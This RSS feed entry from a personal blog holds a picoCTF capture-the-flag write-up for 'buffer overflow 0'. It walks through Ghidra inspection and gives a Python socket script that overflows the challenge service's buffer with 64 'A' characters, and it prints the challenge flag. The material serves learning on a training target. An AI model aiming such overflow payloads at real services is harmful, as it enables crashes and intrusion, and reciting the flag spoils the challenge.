<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>exploit - Tag - Pascal's Blog</title><link>https://blog.ppeinecke.de/tags/exploit/</link><description>exploit - Tag - Pascal's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 06 Apr 2022 13:50:56 +0200</lastBuildDate><atom:link href="https://blog.ppeinecke.de/tags/exploit/" rel="self" type="application/rss+xml"/><item><title>picoCTF - Binary Exploitation - Buffer Overflow 0</title><link>https://blog.ppeinecke.de/posts/picoctf-binary-exploitation-buffer-overflow-0/</link><pubDate>Wed, 06 Apr 2022 13:50:56 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-binary-exploitation-buffer-overflow-0/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="binary-exploitation---buffer-overflow-0---writeup">Binary Exploitation - buffer overflow 0 - writeup</h1>
<h2 id="description">Description</h2>
<p>Smash the stack</p>
<p>Let&rsquo;s start off simple, can you overflow the correct buffer?</p>
<p>The program is available here.</p>
<p>You can view source here.</p>
<p>And connect with it using: nc saturn.picoctf.net 57331</p>
<h2 id="writeup">Writeup</h2>
<p>First I checked the strings of the binary file using the strings command but unfortunately I did not find anything interesting.</p>
<p>Let&rsquo;s fire up Ghidra and see what we&rsquo;ve got here &hellip;</p>
<p>With ghidra I can see that the main function is calling a method called &lsquo;vuln()&rsquo;:</p>
<pre><code>00011472 e8 dc fe ff ff       CALL       vuln     undefined vuln(undefined4 param_1)
</code></pre>
<p>After trying out some stuff I figured out that we just need to supply a lot of characters
to overflow the buffer.</p>
<p>So I went ahead and wrote a simple buffer overlow program using python sockets:</p>
<pre><code class="language-python">import sys, socket, time
 
host = &quot;saturn.picoctf.net&quot; # set host address
port = 57331 # set host port

try:
	ip = socket.gethostbyname( host )
except socket.gaierror:
	#could not resolve
	print('Hostname could not be resolved. Exiting')
	sys.exit()
 
# Unique Pattern
# this is our char pattern we send to overflow 
# the buffer. A char is 1 byte in size.
# So we will overflow the buffer using 64 bytes.
pattern = 'A'*64 + '\n'
 
try:
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
	client.setblocking(0)
	client.settimeout(10)
	client.connect((ip, int(port))) # Connect to user supplied port and IP address
except IOError:
	print(&quot;Connection failed!&quot;)

try:
	msg = client.recv(4096).decode(&quot;utf-8&quot;) # Receive msg
	
	if msg:
		print(&quot;received msg: &quot; + msg)
	else:
		print('disconnected')
except socket.timeout:
	print(&quot;Error! Socket did not get info, when expected&quot;)
except socket.error:
	print(&quot;Error! Socket did not get info, when expected&quot;)
	
print(&quot;ok&quot;)

try:
	client.send(pattern.encode()) # Send the unique pattern
	time.sleep(1)
	print(&quot;done sending&quot;)

	data = client.recv(4096)
	print(&quot;received...&quot;)

	if data:
		print(data)

except socket.timeout:
	print(&quot;Error! Socket did not get info, when expected&quot;)
except socket.error:
	print(&quot;Error! Socket did not get info, when expected&quot;)


client.close() # Close the Connection
</code></pre>
<p>After running my exploit I get the following response:</p>
<pre><code class="language-bash">received msg: Input: 
ok
done sending
received...
picoCTF{ov3rfl0ws_ar3nt_that_bad_9d9ee6b9}
</code></pre>
<p>So here is our flag:</p>
<pre><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_9d9ee6b9}
</code></pre>
]]></description></item></channel></rss>